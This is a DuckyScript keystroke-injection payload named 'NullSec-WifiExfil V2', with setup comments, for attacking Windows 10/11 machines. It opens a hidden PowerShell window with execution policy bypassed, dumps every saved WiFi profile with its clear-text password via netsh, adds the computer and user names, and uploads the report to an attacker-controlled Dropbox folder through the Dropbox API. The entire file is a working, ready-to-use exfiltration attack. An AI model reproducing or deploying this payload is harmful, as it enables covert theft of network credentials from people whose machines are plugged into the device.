REM =============================================
REM NullSec-WifiExfil V2 - Dropbox Export
REM Target: Windows 10/11
REM Author: NullSec (bad-antics) - V2: GreyFA
REM =============================================
REM
REM Extracts WiFi profiles & passwords from Windows
REM Exports directly to Dropbox specific file path
REM Uses Dropbox API v2 for reliable upload
REM
REM SETUP:
REM 1. Create Dropbox app (see DROPBOX_SETUP.md)
REM 2. Generate access token
REM 3. Set DROPBOX_TOKEN below
REM 4. Set DROPBOX_PATH (folder in Dropbox)
REM =============================================

DEFINE #DROPBOX_TOKEN YOUR_DROPBOX_ACCESS_TOKEN_HERE
DEFINE #DROPBOX_PATH /payloads/wifi-logs

DELAY 500
GUI r
DELAY 800
STRINGLN powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue'; $DBtoken='#DROPBOX_TOKEN'; $DBpath='#DROPBOX_PATH'; $timestamp=(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'); $filename=\"wifi-creds-$($env:COMPUTERNAME)-$timestamp.txt\"; $h=$env:COMPUTERNAME; $u=$env:USERNAME; $profiles=(netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object {$_.Matches.Groups[1].Value.Trim()}; $results=@(); foreach($p in $profiles){$detail=netsh wlan show profile name=\"$p\" key=clear; $key=($detail | Select-String 'Key Content\s+:\s+(.+)$'); $pw=if($key){$key.Matches.Groups[1].Value.Trim()}else{'(no key)'}; $auth=($detail | Select-String 'Authentication\s+:\s+(.+)$').Matches.Groups[1].Value.Trim(); $results+=\"[$p] Auth: $auth | Pass: $pw\"}; $content=\"=== WiFi Credentials Exfiltration ===\nTimestamp: $timestamp\nHostname: $h\nUsername: $u\n\nNetworks Found: $($results.Count)\n\n$($results -join \"`n\")\n\n=== End Report ==="; $body=$content | Out-String; $dropboxPath=\"$DBpath/$filename\"; $headers=@{'Authorization'=\"Bearer $DBtoken\"; 'Content-Type'='application/octet-stream'; 'Dropbox-API-Arg'=(\"{\\\"path\\\":\\\"$dropboxPath\\\",\\\"mode\\\":\\\"add\\\",\\\"autorename\\\":true}\" | ConvertTo-Json -Depth 1)}; try{Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Method Post -Headers $headers -Body $body -ErrorAction Stop; Write-Host 'Success: Uploaded to Dropbox'}catch{Write-Host \"Error: $_\"}"
